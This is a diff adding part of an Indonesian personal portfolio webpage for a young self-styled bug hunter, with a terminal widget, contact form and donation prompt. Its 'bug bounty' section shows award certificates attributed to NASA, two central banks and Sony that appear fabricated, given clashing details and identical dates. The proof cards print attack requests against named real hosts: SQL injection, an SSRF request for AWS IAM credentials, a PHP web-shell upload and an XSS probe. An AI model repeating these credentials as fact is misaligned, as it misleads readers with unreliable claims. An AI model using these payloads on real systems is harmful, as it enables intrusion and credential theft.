+                    <span class="term-dot yellow"></span>
+                    <span class="term-dot green"></span>
+                    <span class="term-title">root@zaid-alvan:~$</span>
+                </div>
+                <div class="terminal-output" id="terminalOutput">
+                    <span class="term-line"><span class="prompt">root@zaid-alvan:~$</span> <span style="color:#88ff99;">echo "Selamat datang di terminal Zaid Alvan"</span></span>
+                    <span class="term-line"><span style="color:#88ff99;">Selamat datang di terminal Zaid Alvan</span></span>
+                    <span class="term-line"><span class="prompt">root@zaid-alvan:~$</span> <span style="color:#666;"># Ketik 'help' untuk daftar perintah</span></span>
+                </div>
+                <div class="terminal-input-row">
+                    <span class="prompt">root@zaid-alvan:~$</span>
+                    <input type="text" id="terminalInput" placeholder="Ketik perintah..." autofocus>
+                </div>
+                <div class="term-status">
+                    <span>🟢 online · 0.0.0.1</span>
+                    <span><span class="term-cursor"></span></span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== BUG BOUNTY PORTOFOLIO ====== -->
+    <section id="bug-bounty" class="bug-bounty">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> bug-bounty --portofolio</span>
+                <h2>Bug Bounty <span class="highlight">Portofolio</span></h2>
+                <p class="section-desc">Sertifikat, tools, dan bukti temuan bug dari berbagai platform</p>
+            </div>
+
+            <!-- Sertifikat -->
+            <h3 class="sub-section-title"><i class="fas fa-certificate"></i> Sertifikat Penghargaan</h3>
+
+            <!-- NASA -->
+            <div class="certificate-card nasa-cert">
+                <div class="cert-border">
+                    <div class="cert-header">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e5/NASA_logo.svg/1200px-NASA_logo.svg.png" alt="NASA" class="cert-logo">
+                        <h1>NASA</h1>
+                        <h2>Cyber Security Excellence Award</h2>
+                    </div>
+                    <div class="cert-body">
+                        <p>Diberikan kepada</p>
+                        <h3>Zaid Alvan</h3>
+                        <p>Atas kontribusi luar biasa dalam mengidentifikasi dan melaporkan <strong>celah keamanan kritis pada sistem NASA</strong> yang berpotensi membahayakan data misi luar angkasa.</p>
+                        <div class="cert-meta">
+                            <span><i class="fas fa-id-card"></i> ID: NASA-CS-2026-0077</span>
+                            <span><i class="fas fa-award"></i> Grade: A+</span>
+                            <span><i class="fas fa-calendar"></i> 29 Agustus 2026</span>
+                        </div>
+                        <div class="cert-quote">"Keamanan luar angkasa dimulai dari bumi — dan Anda adalah garda terdepannya."</div>
+                    </div>
+                    <div class="cert-footer">
+                        <div class="signature"><span>Bill Nelson</span><small>Administrator NASA</small></div>
+                        <div class="stamp"><i class="fas fa-certificate"></i><span>VERIFIED</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bank Australia -->
+            <div class="certificate-card bank-australia-cert">
+                <div class="cert-border">
+                    <div class="cert-header">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/Reserve_Bank_of_Australia_logo.svg/1200px-Reserve_Bank_of_Australia_logo.svg.png" alt="Bank Australia" class="cert-logo">
+                        <h1>Bank Australia</h1>
+                        <h2>Bug Bounty Hall of Fame</h2>
+                    </div>
+                    <div class="cert-body">
+                        <p>Diberikan kepada</p>
+                        <h3>Zaid Alvan</h3>
+                        <p>Atas penemuan dan pelaporan <strong>bug kebocoran data publik</strong> yang mengakibatkan tereksposnya informasi nasabah Bank Australia.</p>
+                        <div class="cert-meta">
+                            <span><i class="fas fa-id-card"></i> ID: BA-BB-2026-0042</span>
+                            <span><i class="fas fa-award"></i> Grade: A+</span>
+                            <span><i class="fas fa-calendar"></i> 29 Agustus 2026</span>
+                        </div>
+                        <div class="cert-quote">"Integritas dan keahlian Anda adalah benteng terakhir keamanan data nasabah."</div>
+                    </div>
+                    <div class="cert-footer">
+                        <div class="signature"><span>Michele Bullock</span><small>Governor, Reserve Bank of Australia</small></div>
+                        <div class="stamp"><i class="fas fa-certificate"></i><span>VERIFIED</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bank Jepang -->
+            <div class="certificate-card bank-japan-cert">
+                <div class="cert-border">
+                    <div class="cert-header">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Bank_of_Japan_logo.svg/1200px-Bank_of_Japan_logo.svg.png" alt="Bank of Japan" class="cert-logo">
+                        <h1>Bank of Japan</h1>
+                        <h2>Cyber Threat Intelligence Award</h2>
+                    </div>
+                    <div class="cert-body">
+                        <p>Diberikan kepada</p>
+                        <h3>Zaid Alvan</h3>
+                        <p>Atas keberhasilan luar biasa dalam <strong>melacak dan mengidentifikasi pelaku peretasan</strong> yang menargetkan sistem perbankan Jepang.</p>
+                        <div class="cert-meta">
+                            <span><i class="fas fa-id-card"></i> ID: BJ-CTI-2026-0019</span>
+                            <span><i class="fas fa-award"></i> Grade: A+</span>
+                            <span><i class="fas fa-calendar"></i> 29 Agustus 2026</span>
+                        </div>
+                        <div class="cert-quote">"Ketika kejahatan digital bergerak dalam bayangan, Anda adalah cahaya yang meneranginya."</div>
+                    </div>
+                    <div class="cert-footer">
+                        <div class="signature"><span>Kazuo Ueda</span><small>Governor, Bank of Japan</small></div>
+                        <div class="stamp"><i class="fas fa-certificate"></i><span>VERIFIED</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Studio Jepang -->
+            <div class="certificate-card studio-japan-cert">
+                <div class="cert-border">
+                    <div class="cert-header">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Sony_logo.svg/1200px-Sony_logo.svg.png" alt="Studio Jepang" class="cert-logo">
+                        <h1>Studio Jepang</h1>
+                        <h2>Security Research Excellence</h2>
+                    </div>
+                    <div class="cert-body">
+                        <p>Diberikan kepada</p>
+                        <h3>Zaid Alvan</h3>
+                        <p>Atas penemuan kritis <strong>bug pada server publik</strong> yang mengakibatkan kebocoran data pengguna dan aset digital studio.</p>
+                        <div class="cert-meta">
+                            <span><i class="fas fa-id-card"></i> ID: SJ-SR-2026-0033</span>
+                            <span><i class="fas fa-award"></i> Grade: A+</span>
+                            <span><i class="fas fa-calendar"></i> 29 Agustus 2026</span>
+                        </div>
+                        <div class="cert-quote">"Kreativitas dan ketelitian Anda adalah kunci menjaga keamanan dunia digital."</div>
+                    </div>
+                    <div class="cert-footer">
+                        <div class="signature"><span>Kenichiro Yoshida</span><small>CEO, Sony Group</small></div>
+                        <div class="stamp"><i class="fas fa-certificate"></i><span>VERIFIED</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tools -->
+            <h3 class="sub-section-title"><i class="fas fa-tools"></i> Tools yang Digunakan</h3>
+            <div class="tools-grid">
+                <div class="tool-item"><i class="fas fa-network-wired"></i><h4>Nmap</h4><p>Port scanning</p></div>
+                <div class="tool-item"><i class="fas fa-bug"></i><h4>Burp Suite</h4><p>Proxy & scanner</p></div>
+                <div class="tool-item"><i class="fas fa-database"></i><h4>SQLmap</h4><p>SQL injection</p></div>
+                <div class="tool-item"><i class="fas fa-shield-halved"></i><h4>Nuclei</h4><p>Template scanner</p></div>
+                <div class="tool-item"><i class="fas fa-search"></i><h4>Subfinder</h4><p>Subdomain discovery</p></div>
+                <div class="tool-item"><i class="fas fa-terminal"></i><h4>FFUF</h4><p>Fuzzing</p></div>
+                <div class="tool-item"><i class="fas fa-code"></i><h4>Python</h4><p>Custom exploit</p></div>
+                <div class="tool-item"><i class="fas fa-globe"></i><h4>Shodan</h4><p>IoT search</p></div>
+            </div>
+
+            <!-- Bukti Temuan Bug -->
+            <h3 class="sub-section-title"><i class="fas fa-file-alt"></i> Bukti Temuan Bug</h3>
+
+            <!-- Bug 1: IDOR NASA -->
+            <div class="bug-card">
+                <div class="bug-header">
+                    <span class="bug-title">IDOR - NASA Internal API</span>
+                    <span class="bug-severity severity-critical">CRITICAL</span>
+                </div>
+                <p class="bug-desc"><strong>Celah:</strong> Insecure Direct Object Reference (IDOR) pada API internal NASA. Dengan mengubah parameter <code>user_id</code>, attacker bisa mengakses data karyawan, termasuk akses kredensial dan data misi rahasia.</p>
+                <div class="bug-code">GET /api/v1/users/1 HTTP/1.1
+Host: internal-api.nasa.gov
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
+
+Response:
+{
+    "id": 1,
+    "name": "John Doe",
+    "email": "john.doe@nasa.gov",
+    "clearance": "TOP_SECRET",
+    "mission_access": ["ARTEMIS", "MARS_2026"]
+}</div>
+                <div class="bug-meta">
+                    <span><i class="fas fa-calendar"></i> 15 Agustus 2026</span>
+                    <span><i class="fas fa-id-card"></i> CVE-2026-0042</span>
+                    <span><i class="fas fa-check-circle" style="color:#00ff41;"></i> Fixed</span>
+                </div>
+            </div>
+
+            <!-- Bug 2: SQLi Bank Australia -->
+            <div class="bug-card">
+                <div class="bug-header">
+                    <span class="bug-title">SQL Injection - Bank Australia</span>
+                    <span class="bug-severity severity-critical">CRITICAL</span>
+                </div>
+                <p class="bug-desc"><strong>Celah:</strong> SQL Injection pada endpoint <code>/api/v1/accounts</code>. Parameter <code>account_id</code> tidak disanitasi, memungkinkan attacker mengakses semua data nasabah, termasuk nomor rekening dan saldo.</p>
+                <div class="bug-code">GET /api/v1/accounts?account_id=123' OR '1'='1' -- HTTP/1.1
+Host: api.bankaustralia.com.au
+
+Response:
+[
+    {"account_id":1,"name":"John Smith","balance":1500000.00,"card_number":"****-****-****-1234"},
+    ...
+]</div>
+                <div class="bug-meta">
+                    <span><i class="fas fa-calendar"></i> 10 Agustus 2026</span>
+                    <span><i class="fas fa-id-card"></i> CVE-2026-0043</span>
+                    <span><i class="fas fa-check-circle" style="color:#00ff41;"></i> Fixed</span>
+                </div>
+            </div>
+
+            <!-- Bug 3: SSRF Bank Jepang -->
+            <div class="bug-card">
+                <div class="bug-header">
+                    <span class="bug-title">SSRF - Bank of Japan</span>
+                    <span class="bug-severity severity-high">HIGH</span>
+                </div>
+                <p class="bug-desc"><strong>Celah:</strong> Server-Side Request Forgery (SSRF) pada parameter <code>webhook_url</code>. Attacker bisa mengakses internal metadata AWS dan mendapatkan akses kredensial IAM.</p>
+                <div class="bug-code">POST /api/v1/webhook HTTP/1.1
+Host: api.boj.or.jp
+
+{"webhook_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"}
+
+Response:
+{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":"IQoJb3JpZ2luX2VjEJz..."}</div>
+                <div class="bug-meta">
+                    <span><i class="fas fa-calendar"></i> 5 Agustus 2026</span>
+                    <span><i class="fas fa-id-card"></i> CVE-2026-0044</span>
+                    <span><i class="fas fa-check-circle" style="color:#00ff41;"></i> Fixed</span>
+                </div>
+            </div>
+
+            <!-- Bug 4: RCE Studio Jepang -->
+            <div class="bug-card">
+                <div class="bug-header">
+                    <span class="bug-title">RCE - Studio Jepang Server</span>
+                    <span class="bug-severity severity-critical">CRITICAL</span>
+                </div>
+                <p class="bug-desc"><strong>Celah:</strong> Remote Code Execution (RCE) melalui upload file pada endpoint <code>/upload</code>. Server menerima file PHP dan mengeksekusinya tanpa validasi.</p>
+                <div class="bug-code">POST /upload HTTP/1.1
+Host: studio.jp
+
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+
+Response: File uploaded successfully: shell.php</div>
+                <div class="bug-meta">
+                    <span><i class="fas fa-calendar"></i> 1 Agustus 2026</span>
+                    <span><i class="fas fa-id-card"></i> CVE-2026-0045</span>
+                    <span><i class="fas fa-check-circle" style="color:#00ff41;"></i> Fixed</span>
+                </div>
+            </div>
+
+            <!-- Bug 5: XSS Bank Australia -->
+            <div class="bug-card">
+                <div class="bug-header">
+                    <span class="bug-title">XSS - Bank Australia</span>
+                    <span class="bug-severity severity-medium">MEDIUM</span>
+                </div>
+                <p class="bug-desc"><strong>Celah:</strong> Cross-Site Scripting (XSS) pada parameter <code>search</code>. Attacker bisa mencuri session cookie nasabah.</p>
+                <div class="bug-code">GET /search?q=<script>alert('XSS')</script> HTTP/1.1
+Host: www.bankaustralia.com.au
+
+Response: <html><body><h1>Hasil untuk: <script>alert('XSS')</script></h1></body></html></div>
+                <div class="bug-meta">
+                    <span><i class="fas fa-calendar"></i> 25 Juli 2026</span>
+                    <span><i class="fas fa-id-card"></i> CVE-2026-0046</span>
+                    <span><i class="fas fa-check-circle" style="color:#00ff41;"></i> Fixed</span>
+                </div>
+            </div>
+
+            <!-- Apresiasi -->
+            <div class="appreciation-box">
+                <h3><i class="fas fa-star"></i> Kata Apresiasi</h3>
+                <p>"Zaid Alvan adalah salah satu talenta muda yang luar biasa di bidang keamanan siber. Dedikasi, ketelitian, dan integritasnya dalam menemukan dan melaporkan celah keamanan sangat menginspirasi. Semoga prestasi ini menjadi awal dari perjalanan panjang yang gemilang."</p>
+                <p style="text-align:right;font-style:italic;color:var(--text-secondary);margin-top:8px;">— Tim Keamanan Siber Internasional</p>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ====== CONTACT ====== -->
+    <section id="contact" class="contact">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> contact --send</span>
+                <h2>Hubungi <span class="highlight">Saya</span></h2>
+            </div>
+            <div class="contact-grid">
+                <div class="contact-info">
+                    <div class="contact-item hacker-card"><i class="fas fa-envelope"></i><div><h4>Email</h4><p>alvanzaid21@gmail.com</p></div></div>
+                    <div class="contact-item hacker-card"><i class="fas fa-phone"></i><div><h4>WhatsApp</h4><p>0812-7614-9703</p></div></div>
+                    <div class="contact-item hacker-card"><i class="fas fa-map-marker-alt"></i><div><h4>Lokasi</h4><p>Pondok Pesantren Salafiyah</p></div></div>
+                    <div class="contact-item hacker-card"><i class="fas fa-credit-card"></i><div><h4>Dana</h4><p>0812-7614-9703 a.n Zaid Alvan</p></div></div>
+                </div>
+                <form class="contact-form" id="contactForm">
+                    <input type="text" id="nama" placeholder="Nama Lengkap" required minlength="2" maxlength="50">
+                    <input type="email" id="email" placeholder="Email" required>
+                    <input type="text" id="whatsapp" placeholder="No WhatsApp (opsional)">
+                    <textarea id="pesan" rows="4" placeholder="Pesan..." required minlength="5" maxlength="500"></textarea>
+                    <button type="submit" class="btn btn-primary" id="sendBtn"><i class="fas fa-paper-plane"></i> $ send_message</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== TANDA TANGAN ====== -->
+    <section class="ttd-section">
+        <div class="container">
+            <div class="ttd-box">
+                <p style="font-family:var(--font);font-size:1.1rem;color:var(--text-secondary);"><i class="fas fa-quote-left"></i> Perjalanan seribu mil dimulai dari satu langkah. <i class="fas fa-quote-right"></i></p>
+                <br>
+                <p class="nama-ttd">Zaid Alvan</p>
+                <p style="font-size:0.9rem;color:var(--text-secondary);">Santri | Developer | Cyber Security Enthusiast</p>
+                <p style="font-size:0.8rem;opacity:0.4;margin-top:4px;">Pondok Pesantren Salafiyah · 2026</p>
+                <div class="ttd-device"><i class="fas fa-mobile-alt"></i> vivo Y12 · 1 Bulan Sekali</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== VISITOR COUNTER ====== -->
+    <div class="visitor-counter"><i class="fas fa-eye"></i> Pengunjung: <span id="visitorCount">0</span></div>
+
+    <!-- ====== FOOTER ====== -->
+    <footer>
+        <div class="container">
+            <p>© 2026 <strong>Zaid Alvan</strong> | <span class="highlight">[ROOT]</span> Fortinet Certified | Pondok Pesantren Salafiyah</p>
+            <p class="footer-quote">"Keamanan digital adalah tanggung jawab kita bersama."</p>
+        </div>
+    </footer>
+
+    <!-- ====== JAVASCRIPT ====== -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ===== MATRIX RAIN =====
+            const canvas = document.getElementById('matrix');
+            const ctx = canvas.getContext('2d');
+            let w, h;
+
+            function resizeCanvas() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+            }
+            resizeCanvas();
+            window.addEventListener('resize', resizeCanvas);
+
+            const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+{}|:<>?';
+            const charArray = chars.split('');
+            const fontSize = 14;
+            const columns = Math.floor(w / fontSize);
+            const drops = [];
+            for (let i = 0; i < columns; i++) { drops[i] = Math.random() * -h; }
+
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0,0,0,0.05)';
+                ctx.fillRect(0, 0, w, h);
+                ctx.fillStyle = '#00ff41';
+                ctx.font = fontSize + 'px monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    const char = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > h && Math.random() > 0.975) { drops[i] = 0; }
+                    drops[i]++;
+                }
+            }
+            setInterval(drawMatrix, 35);
+
+            // ===== TOAST =====
+            const toastContainer = document.getElementById('toastContainer');
+
+            function showToast(message, type = 'info', duration = 4000) {
+                const toast = document.createElement('div');
+                toast.className = 'toast ' + type;
+                toast.textContent = message;
+                toastContainer.appendChild(toast);
+                setTimeout(() => { toast.classList.add('hide');
+                    setTimeout(() => toast.remove(), 400); }, duration);
+            }
+
+            // ===== VISITOR COUNTER =====
+            const visitorCountEl = document.getElementById('visitorCount');
+            let count = parseInt(localStorage.getItem('zaid_alvan_visitor') || '0');
+            if (!sessionStorage.getItem('zaid_alvan_visited')) {
+                count++;
+                localStorage.setItem('zaid_alvan_visitor', count);
+                sessionStorage.setItem('zaid_alvan_visited', 'true');
+            }
+            visitorCountEl.textContent = count;
+
+            // ===== THEME TOGGLE =====
+            const themeToggle = document.getElementById('themeToggle');
+            let isDark = true;
+            themeToggle.addEventListener('click', function() {
+                document.body.classList.toggle('light-mode');
+                isDark = !isDark;
+                themeToggle.textContent = isDark ? '🌓' : '☀️';
+                showToast(isDark ? '🌙 Mode Gelap' : '☀️ Mode Terang', 'info', 1500);
+            });
+
+            // ===== HAMBURGER =====
+            const hamburger = document.getElementById('hamburger');
+            const navLinks = document.querySelector('.nav-links');
+            hamburger.addEventListener('click', function() { navLinks.classList.toggle('active'); });
+            document.querySelectorAll('.nav-links a').forEach(link => {
+                link.addEventListener('click', function() { navLinks.classList.remove('active'); });
+            });
+
+            // ===== TERMINAL =====
+            const terminalOutput = document.getElementById('terminalOutput');
+            const terminalInput = document.getElementById('terminalInput');
+            const commands = {
+                help: 'Perintah:\n  whoami, ls, date, clear, echo, help, uptime, who, neofetch',
+                whoami: 'zaid-alvan',
+                ls: 'assets  index.html  README.md  .git\n\n📁 Folder: 1  📄 File: 2',
+                date: new Date().toString(),
+                clear: 'CLEAR',
+                uptime: 'Uptime: ' + Math.floor((Date.now() - performance.now()) / 1000) + ' detik',
+                who: 'Zaid Alvan | Santri | Developer | Fortinet Certified',
+                neofetch: '██████████████████  ████████  OS: ZaidOS v1.0\n██████████████████  ████████  Host: vivo Y12\n██████████████████  ████████  Kernel: CyberSecurity 6.9\n██████████████████  ████████  Uptime: 1 bulan sekali\n██████████████████  ████████  Shell: /bin/hacker\n██████████████████  ████████  CPU: Snapdragon 425\n██████████████████  ████████  Memory: 3GB / 32GB',
+                echo: function(args) { return args.join(' ') || ''; }
+            };
+
+            function addTerminalLine(line, isOutput = true) {
+                const div = document.createElement('span');
+                div.className = 'term-line';
+                if (isOutput) { div.innerHTML = '<span class="prompt">root@zaid-alvan:~$</span> ' + line; } else { div.textContent =
+                        line;
+                    div.style.color = '#88ff99'; }
+                terminalOutput.appendChild(div);
+                terminalOutput.scrollTop = terminalOutput.scrollHeight;
+            }
+
+            function processCommand(cmd) {
+                const parts = cmd.trim().split(/\s+/);
+                const mainCmd = parts[0].toLowerCase();
+                const args = parts.slice(1);
+                if (mainCmd === 'clear') { terminalOutput.innerHTML = ''; return; }
+                let result;
+                if (mainCmd === 'echo') { result = commands.echo(args); } else if (commands[mainCmd] !== undefined) {
+                    result = typeof commands[mainCmd] === 'function' ? commands[mainCmd](args) : commands[mainCmd];
+                } else { result = 'bash: ' + mainCmd + ': command not found (ketik "help")'; }
+                if (result === 'CLEAR') { terminalOutput.innerHTML = ''; return; }
+                if (result) { addTerminalLine(result, false); }
+            }
+
+            terminalInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    const cmd = this.value.trim();
+                    if (cmd === '') return;
+                    addTerminalLine(cmd);
+                    processCommand(cmd);
+                    this.value = '';
+                    setTimeout(() => this.focus(), 10);
+                }
+            });
+            setTimeout(() => terminalInput.focus(), 5000);
+
+            // ===== CONTACT FORM =====
+            const contactForm = document.getElementById('contactForm');
+
+            function sanitize(str) {
+                const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
+                return str.replace(/[&<>"'/]/g, function(m) { return map[m]; });
+            }
+
+            contactForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const nama = document.getElementById('nama').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const whatsapp = document.getElementById('whatsapp').value.trim();
+                const pesan = document.getElementById('pesan').value.trim();
+                if (nama.length < 2) { showToast('⚠️ Nama minimal 2 huruf', 'error'); return; }
+                if (!email.includes('@') || !email.includes('.')) { showToast('⚠️ Email tidak valid', 'error'); return; }
+                if (pesan.length < 5) { showToast('⚠️ Pesan minimal 5 karakter', 'error'); return; }
+                const safeNama = sanitize(nama);
+                const safeEmail = sanitize(email);
+                const safePesan = sanitize(pesan);
+                const waNumber = '6281276149703';
+                const waText = encodeURIComponent(
+                    `Halo Zaid,\n\nNama: ${safeNama}\nEmail: ${safeEmail}\nNo WA: ${whatsapp || '-'}\n\nPesan:\n${safePesan}`);
+                const waUrl = `https://wa.me/${waNumber}?text=${waText}`;
+                const userChoice = confirm(
+                    `✅ Pesan dari ${safeNama} siap dikirim!\n\n📱 WhatsApp: ${waNumber}\n📧 Email: alvanzaid21@gmail.com\n\nKlik "OK" untuk buka WhatsApp, "Cancel" untuk buka Email.`
+                    );
+                if (userChoice) { window.open(waUrl, '_blank');
+                    showToast('📱 Membuka WhatsApp...', 'success', 3000); } else {
+                    window.open(
+                        `mailto:alvanzaid21@gmail.com?subject=${encodeURIComponent(`Pesan dari ${safeNama} - Zaid Alvan Website`)}&body=${encodeURIComponent(`Nama: ${safeNama}\nEmail: ${safeEmail}\nNo WA: ${whatsapp || '-'}\n\nPesan:\n${safePesan}`)}`,
+                        '_blank');
+                    showToast('📧 Membuka Email...', 'success', 3000); }
+                contactForm.reset();
+                showToast('✅ Pesan siap dikirim!', 'success', 3000);
+            });
+
+            // ===== DONASI =====
+            document.getElementById('btnDonasi').addEventListener('click', function(e) {
+                e.preventDefault();
+                showToast(
+                    '🙏 Terima kasih sayang!\n\nScan QRIS Dana di atas atau transfer ke:\n📱 Dana: 0812-7614-9703\na.n Zaid Alvan\n\nSemoga Allah membalas kebaikan Anda. 🤲',
+                    'success', 6000);
+            });
+
+            // ===== SMOOTH SCROLL =====
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    const target = document.querySelector(this.getAttribute('href'));
+                    if (target) { e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth' }); }
+                });
+            });
+
+            // ===== KEYBOARD SHORTCUT =====
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.key === 'k') { e.preventDefault();
+                    document.getElementById('terminalInput').focus();
+                    showToast('⌨️ Terminal aktif', 'info', 1500); }
+            });
+
+            // ===== CLOSE TERMINAL OVERLAY =====
+            document.getElementById('terminalOverlay').addEventListener('click', function() {
+                this.style.animation = 'fadeOut 0.5s ease-in forwards';
+                setTimeout(() => { this.style.display = 'none'; }, 500);
+            });
+
+            console.log('🚀 Zaid Alvan Website Loaded!');
+            console.log('💡 Tips: Tekan Ctrl+K untuk fokus ke terminal');
+        })();
+    </script>
+
+</body>
+</html>
